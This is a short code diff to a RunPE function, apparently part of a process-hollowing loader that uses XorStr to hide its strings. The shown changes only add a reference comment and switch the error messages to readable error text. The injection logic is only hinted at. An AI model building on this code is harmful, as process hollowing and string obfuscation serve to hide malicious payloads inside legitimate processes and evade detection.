@@ -57,7 +57,10 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
 	STARTUPINFOW SI;
 	memset(&SI, 0, sizeof(STARTUPINFO));
+
+	//https://stackoverflow.com/questions/46380166/getthreadcontext-returning-87 
 	CONTEXT CTX;
+
 	memset(&CTX, 0, sizeof(CONTEXT));
 	PROCESS_BASIC_INFORMATION PBI;
 	memset(&PBI, 0, sizeof(PROCESS_BASIC_INFORMATION));
@@ -130,14 +133,14 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 					} else printfdbg(XorStr("Error pNtQueryInformationProcess\n"));
 
 				}
-				else printfdbg(XorStr("Error writing memory %x\r\n"),GetLastError());
+				else printfdbg(XorStr("Error writing memory %s\r\n"),GetLastErrorAsText());
  
-			}else printfdbg(XorStr("Error allocating memory %x\r\n"),GetLastError());
+			}else printfdbg(XorStr("Error allocating memory %s\r\n"),GetLastErrorAsText());
  
 		}
-		else printfdbg(XorStr("Error getting context %x\r\n"), GetLastError());
+		else printfdbg(XorStr("Error getting context %s\r\n"), GetLastErrorAsText());
 
-	} else printfdbg(XorStr("Error creating process %x\r\n"),GetLastError());
+	} else printfdbg(XorStr("Error creating process %s\r\n"),GetLastErrorAsText());
 
 	if (PI.hProcess)
 	{
